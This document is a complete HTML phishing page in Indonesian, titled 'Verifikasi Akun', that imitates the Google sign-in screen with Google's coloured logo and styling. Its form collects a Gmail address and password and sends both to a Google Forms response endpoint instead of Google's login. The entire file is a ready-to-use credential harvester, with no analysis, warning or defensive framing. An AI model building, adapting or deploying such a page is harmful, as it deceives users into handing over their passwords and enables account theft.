<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Akun</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #ffffff; margin: 0; }
        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #e0e0e0; border-radius: 8px; text-align: center; }
        .brand { font-size: 24px; font-weight: bold; margin-bottom: 8px; }
        .brand span:nth-child(1) { color: #4285F4; } .brand span:nth-child(2) { color: #EA4335; }
        .brand span:nth-child(3) { color: #FBBC05; } .brand span:nth-child(4) { color: #34A853; }
        h2 { font-size: 22px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        .btn-box { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
        .create-acc { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <h2>Masuk</h2>
        <p>Gunakan Akun Google Anda</p>
        
        <form action="https://docs.google.com/forms/d/e/1FAIpQLScrfc6rFhhgQPNUaNC7HVrT8iA_dDMX4DJUWxBw9ojEVa7nhQ/formResponse" method="POST">
            <input type="text" name="entry.123456789" placeholder="Email atau ponsel" required pattern=".*@gmail\.com$" title="Gunakan akun @gmail.com">
            <input type="password" name="entry.987654321" placeholder="Masukkan sandi Anda" required>
            
            <div class="btn-box">
                <div class="create-acc">Lupa email?</div>
                <button type="submit">Berikutnya</button>
            </div>
        </form>
    </div>
</body>
</html>
